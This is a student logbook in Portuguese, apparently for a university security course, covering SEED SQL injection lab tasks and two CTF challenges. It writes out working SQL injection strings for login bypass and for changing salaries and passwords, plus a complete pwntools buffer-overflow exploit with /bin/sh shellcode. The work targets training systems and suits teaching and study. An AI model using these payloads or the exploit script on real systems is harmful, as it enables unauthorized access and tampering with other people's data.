# LOGBOOK 8

## LAB

### Tarefa 1

Após carregar a base de dados com os comandos fornecidos, usamos a *query* `SELECT * FROM credential WHERE Name='Alice';` para imprimir a informação pretendida.

![](https://i.imgur.com/UNA3HPq.png)

![](https://i.imgur.com/4Gb4uLs.png)

### Tarefa 2

#### Tarefa 2.1

Depois de iniciarmos os *docker containers* e configurarmos o ficheiro `/etc/hosts` acedemos à pagina web http://www.seed-server.com e analisámos o método de autenticação no ficheiro **unsafe_home.php**.

![](https://i.imgur.com/f2CAVKX.png)

Verificámos que conseguiamos entrar como admin se usássemos a string `admin'#`. Isto deve-se ao facto de esta *string* fazer com que o *query* de sql passe apenas a pesquisar pelo *username* sem verificar a *password* pois ao metermos o apóstrofe depois do `admin` fechamos o *query* e depois o cardinal comenta o resto do antigo *query* fazendo com que seja possível entramos como `admin` sem sabermos a *password*.

![](https://i.imgur.com/T3eglSr.png)

#### Tarefa 2.2

De seguinda, tentámos fazer o mesmo mas em vez de usarmos a página *web* fizemos um *curl request*.

![](https://i.imgur.com/A8TpBFr.png)

Como podemos nesta *screenshot* a ideia para conseguirmos encontrar como um `admin` foi igual mas tivemos de ter em conta que não podíamos usar caracteres especiais. Para contornarmos isso substituímos o apóstrofe por **%27** e o cardinal por **%23**.

Verificámos que conseguimos entrar como `admin` depois vendo a *output* do terminal depois de executarmos este comando que demonstra a mesma informação que estava na *webpage* mas apenas em formato html.

![](https://i.imgur.com/XjC1mUP.png)

#### Tarefa 2.3

Esta tarefa consistia em introduzir um *input* com `;` de forma a introduzir uma *query* de **UPDATE/DELETE**. De forma a realizar este ataque, usamos a *string* `admin'; UPDATE credential SET Name = 'TESTE' WHERE Name = 'Alice'; #`. No entanto, o código está prevenido contra este tipo de ataques.

Através de pesquisa na internet, descobrimos que este tipo de ataque chama-se ***PiggyBacked Queries*** e que, provavelmente, a defesa usada é ***Filter and sanitize inputs***.

![](https://i.imgur.com/R2opke4.png)

![](https://i.imgur.com/qK9gF7w.png)

### Tarefa 3

#### Tarefa 3.1

Colocando a *string* ` ', salary = 10 WHERE name='Alice' #` em qualquer um dos campos de *input* na página de edição de perfil (exceto o da *password*), isto acontece porque o primeiro apóstrofe fecha a *string* de *input* e a vírgula, seguido da expressão que contém a informação a modificar, injeta no SQL código que permite alterar dados. Por fim, o cardinal vai comentar o restante código, ignorando-o.

![](https://i.imgur.com/3U0xc3J.png)

![](https://i.imgur.com/sAwbKGs.png)

#### Tarefa 3.2

Esta tarefa é muito semelhante à anterior, sendo apenas necessário alterar a *string* para suportar os valores necessários: ` ', salary = 1 WHERE name='Boby' #`

![](https://i.imgur.com/gn5HUTp.png)

![](https://i.imgur.com/jqydr3m.png)

#### Tarefa 3.3

Sabendo que a *password* está enciptada em *sha1*, é apenas necessário usar o *input* `', password = '2e6f9b0d5885b6010f9167787445617f553a735f' WHERE name='Boby' # ` na página de *Edit Profile* para modificar a *password*. O valor utilizado `2e6f9b0d5885b6010f9167787445617f553a735f` corresponde à *string* `teste`, que vai ser a nova password associada á conta do Boby.

![](https://i.imgur.com/GUFSVpr.png)

É possível confirmar que o valor da *password* foi modificado na base de dados através da *printscreen* seguinte:

![](https://i.imgur.com/lyLlyZH.png)

![](https://i.imgur.com/5nEma3E.png)

## CTFs

### Desafio 1

De forma a tentar descobrir qual seria a vulnerabilidade disponível para resolver este desafio, decidimos analisar o código fonte. Esta abordagem permitiu-nos descobrir que, na linha 40, existe uma vulnerabilidade de ***SQL Injection*** que podemos explorar.

![](https://i.imgur.com/maYWitr.png)

Assim, tentamos utilizar diferentes tipos de *input* chegando ao resultado que nos permitiu explorar esta vulnerabilidade: ` admin' or ''=' `. Isto acontece porque estamos a introduzir o *username* correto `admin`, seguido do operador lógico **or** e qualquer expressão que tenha um valor boleano associado, neste caso `'='`, que tem valor *true*. Desta forma, é possível alterar a *query* para retornar *true* desde que o *username* inserido seja o correto.

![](https://i.imgur.com/QRBVL4i.png)


### Desafio 2

Execuntando o comando `checksec` no ficheiro *program* é possível verificar os seguintes resultados:

![](https://i.imgur.com/3FU8tnG.png)

Estes resultado mostram que, dependendo de como o código estiver estruturado, pode existir uma vulnerabilidade por ***Buffer Overflow*** devido à inexistência de canários.

Qual é a linha do código onde a vulnerabilidade se encontra?
 - a vulnerabilidade encontra-se na linha 12 do ficheiro `main.c`;

![](https://i.imgur.com/Ahuxgte.png)

O que é que a vulnerabilidade permite fazer?
 - alterar valores de endereços guardados em memória;
 - permite ao atacante executar código arbitrário.

O código que usamos para dar buffer overflow foi o seguinte:

```
#!/usr/bin/python3
from pwn import *

p = remote('ctf-fsi.fe.up.pt',4001)

# read address from output
buffer= p.recvuntil(b"input:")[43:43+11]

buffer = int(buffer,16)

# Replace the content with the actual shellcode
shellcode= (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(500)) 

# Put the shellcode somewhere in the payload
start = 450               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = buffer+start           # Change this number 
offset = 104 + 4              # Change this number 

L = 4     # Use 4
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 

p.sendline(content)
p.interactive()
``` 

Para conseguirmos o endereço do *buffer* especificamos que caracteres do *input* queriamos ler para a variável *buffer*.

```
buffer= p.recvuntil(b"input:")[43:43+11]
buffer = int(buffer,16)
```

Metemos o *shellcode* no final da *payload* para conseguirmos aceder à *shell*.

```
# Put the shellcode somewhere in the payload
start = 450
content[start:start + len(shellcode)] = shellcode
```

Finalmente encontramos o endereço do registo e *ebp* e calculámos a diferença entre eles adicionando 4 no final para passarmos para o endereço de retorno.
```
ret    = buffer+start
offset = 104 + 4   
```

![](https://i.imgur.com/p0A6MRt.png)

![](https://i.imgur.com/BoDGNdT.png)

![](https://i.imgur.com/pgHbnee.png)

Depois de enviarmos o nosso *buffer* para o servidor, confirmamos que o *shellcode* está a executar, e realizamos os comandos `ls` e `cat flag.txt` para obtermos a *flag* pretendida.

![](https://i.imgur.com/BNbU9rN.png)

